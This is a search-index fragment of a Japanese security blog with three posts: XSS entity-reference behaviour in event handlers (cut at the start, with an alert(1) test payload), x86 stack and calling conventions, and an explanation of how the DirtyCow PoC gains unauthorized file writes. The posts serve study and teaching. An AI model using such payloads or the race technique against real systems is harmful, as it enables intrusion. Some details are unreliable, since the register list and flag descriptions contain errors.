onerror=alert(1)\u0026gt;と表示され、アラートは発火しない。\nイベントハンドラと同じJavaScriptコードがscriptタグに埋め込まれている場合を考える。\n以下のようなHTMLがサーバーによって生成される。\n1 2 3 \u0026lt;script\u0026gt; x=\u0026#39;\u0026amp;#x0027;\u0026amp;#x003b;alert\u0026amp;#x0028;1\u0026amp;#x0029;\u0026amp;#x003b;\u0026amp;#x0027;\u0026#39;; \u0026lt;/script\u0026gt; これを開いてもアラートは実行されない。\nこれらからイベントハンドラでのみ実体参照が評価された状態でJavaScriptが実行されることがわかる。\n","date":"Nov 07","permalink":"https://mute1997.github.io/post/2020-11-07-entity-reference-in-event-handler/","tags":["security"],"title":"イベントハンドラでの実体参照の扱い"},{"categories":null,"contents":"以下の文書はx86についての説明です。\nメモリ配置 メモリ配置は以下の図のようになっています。\nテキストセグメントには実行されるコード、データセグメントは初期化済みのグローバル変数、bssセグメントには初期化されていないグローバル変数、ヒープセグメントは、mallocなどで動的に確保される変数が配置されます。\n今回はスタックに焦点をあてて説明していきます。\nスタック スタックとはメモリ上の領域の1つで、\n引数の保存 ローカル変数の保存 関数呼び出し に利用されます。\nスタックのアドレスは高値から低位に伸びていき、ebp, espレジスタにスタックのアドレスが保存されます。 以下の画像の様に、ebpは現在の関数のスタックの底を、espはスタックのトップを表しています。\nこれらのレジスタの値はpush, pop, call, retによって操作されます。\npushすると値がスタックに追加されたあとにespが4(x86_64の場合は8)だけデクリメントされ、popすると値がレジスタに読み込まれてespがインクリメントされます。\ncallの場合には、eipをリターンアドレスとしてpush, eipを呼び出し関数の先頭にセットします。 retすると、スタックからアドレスを取得してeipにセットします。\nスタックフレーム スタックフレームは以下の様になってます。\nリターンアドレスはcall命令によるもので、ebpのアドレスがあるのは、Function prologueによるものです。\nFunction prologue Function prologueは関数の先頭で行われる処理のことです。 実際には以下のような処理を行います。 push ebpでは、関数の終了時にebpを復元するために一旦スタックに退避しています。 mov ebp,espでは、現在のebpをespに代入することで、現在のスタックトップをベースにしています。\n1 2 push ebp mov ebp,esp Function epilogue Function epilogueは関数の最後に行われる処理のことです。 実際には以下のような処理が行われています。\n1 2 leave ret このleaveという命令は、\n1 2 mov esp ebp pop ebp と同等の処理を行うものです。\nこれらは、espをebpに戻して、スタックからebpの値を復元します。 retでは、前のeipの値をスタックからポップして元のコードに戻ります。\ncalling convention スタックに引数を積む場合には、呼び出し規則(calling convention)と呼ばれる方法があります。 32bitバイナリでは、関数の引数は逆順にスタックに渡されます。 64bitバイナリでは、関数の引数を渡すのにスタックは使わず、レジスタを利用します。 渡される順番は以下の通りです。\nrdi rsi rdx r8 r9 5個を超えるような場合には32bitバイナリと同様にスタックにプッシュされます。\n","date":"Aug 22","permalink":"https://mute1997.github.io/post/2020-08-22-stack-and-calling-conventions/","tags":["linux"],"title":"スタックと呼び出し規約"},{"categories":null,"contents":"DirtyCowについて調べたので理解するのに必要となる前提知識と一緒にPoCについての説明をまとめておきます。\nrootを取ったり、REHLで動くものがありますが今回は一番基本的な、権限のないファイルに書き込むPoC(https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c)についてまとめます。\nDirtyCowについて DirtyCowはCopy on Writeの取り扱いにおいて競合状態が発生し、プライベートなメモリマッピングが破壊されるというものです。 CVEではCVE-2016-5195として管理されています。\nhttps://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-005596.html\n前提知識など mmap mmapはファイルやデバイスをメモリにマッピングするためのものです。\nreadやwriteを使うとカーネル空間からユーザープロセスへのコピーが発生しますが、mmapはマッピングしたアドレスを返すだけでユーザー空間へのコピーが発生しません。\nそのためreadやwriteを使うよりも効率期にファイルの読み書きが可能になるようです。\n\u0026ldquo;なるようです\u0026quot;と書いたのはどの場合においてもmmapのほうが早いわけではないからです。\n日本語で詳しく解説されている記事があったのでどうぞ。\nman mmapしてでてくる情報を簡単にまとめます。 プロトタイプ宣言は次のようになっています。\n1 void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off); addrにはマッピングするアドレスを指定します。NULLを指定するとマッピングするアドレスをカーネルが決定してくれます。\nlenにはマッピングするサイズを指定します。\nprotにはPROT_EXEC, PROT_READ, PROT_WRITE, PROT_NONEを指定します。それぞれ、実行可能、読み書き可能、書き込み可能、アクセス不可能を表します。\nflagsには、MAP_SHARED, MAP_PRIVATE, MAP_FIXEDが指定できます。MAP_PRIVATEが指定されるとCopy on Writeでファイルがマッピングされます。\nfildesにはファイルディスクリプタを指定します。\noffにはファイルのオフセットを指定します。\nmmapを利用した簡単なファイルを読み込むをするサンプルを書いてみました。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; int main(int argc, char *argv[]){ if (argc \u0026lt;= 1) { printf(\u0026#34;please specify filename\\n\u0026#34;); return 1; } int fd = open(argv[1],O_RDONLY); if (fd \u0026lt; 0) { printf(\u0026#34;file not found\\n\u0026#34;); return 1; } printf(\u0026#34;file discriptor: %d\\n\u0026#34;, fd); struct stat st; fstat(fd, \u0026amp;st); printf(\u0026#34;file size: %ld\\n\u0026#34;, st.st_size); char* map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,fd,0); printf(\u0026#34;%s\\n\u0026#34;, map); return 0; } 更に詳しい情報はman mmapで得られます。\nCopy on Write Copy on Writeとは書き込みが行われるまでは元から存在するマッピングを利用し、書き込みが起こったと同時にメモリ上に新たに複製が作られるという動作のことをいいます。\nこれによってforkするたびに、メモリ上に複製を作るより効率よくメモリを利用することができます。\n書き込みによって作られた新たな複製は、他のプロセスからは見ることができません。\nここで実験のために少しコードを書いてみようと思います。\n先ほど説明したように、書き込みが行われるまでは同じマッピングを利用し、書き込みが行われるときに新たな領域が確保され、複製されます。\nプロセスのファイルマッピングは/proc/{pid}/smapsで確認することができます。\n出力はだいたいこんなのが得られます。\nSize: 4 kB KernelPageSize: 4 kB MMUPageSize: 4 kB Rss: 0 kB Pss: 0 kB Shared_Clean: 0 kB Shared_Dirty: 0 kB Private_Clean: 0 kB Private_Dirty: 0 kB Referenced: 0 kB Anonymous: 0 kB LazyFree: 0 kB AnonHugePages: 0 kB ShmemPmdMapped: 0 kB Shared_Hugetlb: 0 kB Private_Hugetlb: 0 kB Swap: 0 kB SwapPss: 0 kB Locked: 0 kB VmFlags: rd mr mw me これを利用してみます。\n先程の説明通りなら、書き込みを行うまでは親プロセスと子プロセスのメモリマッピングは同じ、親プロセスか子プロセスどちらかで書き込むとメモリマッピングが変わるはずです。\n次のようなコード書いて実験してみます。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; #define IS_WRITE 1 int fd; struct stat st; void *map; int main(int argc, char *argv[]){ if (argc \u0026lt;= 1) { printf(\u0026#34;please specify filename\\n\u0026#34;); return 1; } fd = open(argv[1],O_RDWR); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;%s\\n\u0026#34;, strerror(errno)); return 1; } fstat(fd, \u0026amp;st); // MAP_PRIVATE(copy on write)でマッピング map = (char *)mmap(NULL,st.st_size,PROT_WRITE,MAP_PRIVATE,fd,0); // 読み込み FILE *f = fopen(\u0026#34;/dev/null\u0026#34;, \u0026#34;w\u0026#34;); fprintf(f, \u0026#34;%s\\n\u0026#34;, map); if (map == MAP_FAILED) { fprintf(stderr, \u0026#34;%s\\n\u0026#34;, strerror(errno)); return -1; } int pid = getpid(); printf(\u0026#34;(main) pid: %d\\n\u0026#34;, pid); // ------------------- // fork // ------------------- int status; pid = fork(); if (pid == 0) { pid = getpid(); printf(\u0026#34;(fork) pid: %d\\n\u0026#34;, pid); // 読み込み FILE *f = fopen(\u0026#34;/dev/null\u0026#34;, \u0026#34;w\u0026#34;); fprintf(f, \u0026#34;%s\\n\u0026#34;, map); if (!IS_WRITE) sleep(100); // 書き込み strcat(map, \u0026#34;A\u0026#34;); if (IS_WRITE) sleep(100); } wait(\u0026amp;status); // ------------------- if (munmap(map, st.st_size) == -1){ fprintf(stderr, \u0026#34;%s\\n\u0026#34;, strerror(errno)); return -1; } return 0; } マッピングした領域に書き込む前にsleepを挟んでからコンパイルして実行します。\nsleepに入ったらcat /proc/{pid}/smaps | grep -A 20 filenameして子プロセスのマッピングをみます。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Size: 4 kB KernelPageSize: 4 kB MMUPageSize: 4 kB Rss: 4 kB Pss: 2 kB Shared_Clean: 4 kB Shared_Dirty: 0 kB Private_Clean: 0 kB Private_Dirty: 0 kB Referenced: 4 kB Anonymous: 0 kB LazyFree: 0 kB AnonHugePages: 0 kB ShmemPmdMapped: 0 kB Shared_Hugetlb: 0 kB Private_Hugetlb: 0 kB Swap: 0 kB SwapPss: 0 kB Locked: 2 kB VmFlags: wr mr mw me ac Shared_Cleanが4kBになってます。\n親プロセスと子プロセスで同じファイル触っているので共有されていますね。\n書き込みをしてから親プロセスのマッピングを見てみます。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Size: 4 kB KernelPageSize: 4 kB MMUPageSize: 4 kB Rss: 4 kB Pss: 4 kB Shared_Clean: 0 kB Shared_Dirty: 0 kB Private_Clean: 0 kB Private_Dirty: 4 kB Referenced: 4 kB Anonymous: 4 kB LazyFree: 0 kB AnonHugePages: 0 kB ShmemPmdMapped: 0 kB Shared_Hugetlb: 0 kB Private_Hugetlb: 0 kB Swap: 0 kB SwapPss: 0 kB Locked: 4 kB VmFlags: wr mr mw me ac Private_Dirtyが4kBになりましたね。\nマッピングしていたファイルが新しいプロセスのためにメモリ上に新たに複製されました。\nmadvise madviseはカーネルに、メモリのページング処理についてアドバイスを出すために使用します。\n1 int madvise(void *addr, size_t length, int advice); addrにはアドレスを、lengthにはサイズ、adviceにはカーネルに対するアドバイスを渡します。詳細はman madviseで確認することが出来ます。\nDirtyCowではadviceにMADV_DONTNEEDが渡されています。\nこれは、しばらくは指定されたアドレスへのアクセスはなさそうなのでmmapしたメモリは一旦開放して良いということをカーネルに伝えるものです。\nこれによってmmapしたファイルは開放され、次に読み込むときは再びIOが発生し、メモリに読み込まれます。 元ファイルが削除されていた場合は0fillされます。\nPoCコードの解説 https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c\nPoCの大まかな動作としては、mainで読み込みたいファイルをmmap, それからmadviseThread, procselfmemThreadを各スレッドで動かしています。\nmadviseThreadではmadviseをループして何度も実行、procselfmemThreadでは自分のプロセスのメモリである/proc/self/memを開き、mmapされた場所に文字列を書き込み続けています。\nこの2つの動作が連続することにより競合状態が発生し、プライベートなメモリマップであるはずのものがディスクに書き込まれてしまいます。\nこれを理解する上で重要なのはページキャッシュの動作です。\nページキャッシュの動作として、読み込みが行われると、読み込んだものはキャッシュに置かれ、書き込みが行われると、即座に書き込みは行われず、キャッシュに書き込んだ上で適当なタイミングで書き込みが行われます。Linuxカーネルではキャッシュに書き込みを行うと書き込んだページにDirty bitが立てられます。\n先ほど説明したmadviseとwriteを繰り返すと、writeを行ってからDirty bitを立てる前にmadviseによってページがディスクに書き込まれることによって、権限の無いファイルに書き込みができてしまうというわけです。\ndraw.ioで2秒くらいで書いた図によるとこんな感じです。\n最後に 本当はパッチを読んだりしてたんですがこれ以上長くなるとしんどいのでやめました。\nDirtyCowのパッチには不十分で、THPを使用している場合にはCoWを用いることなくdirty bitを立てることができるらしいですね。\n気が向いたらパッチを読みつつ不十分だった部分など解説します。\n","date":"Aug 11","permalink":"https://mute1997.github.io/post/2018-08-11-how-dirtycow-work/","tags":["security"],"title":"DirtycowのPoCを読む"}]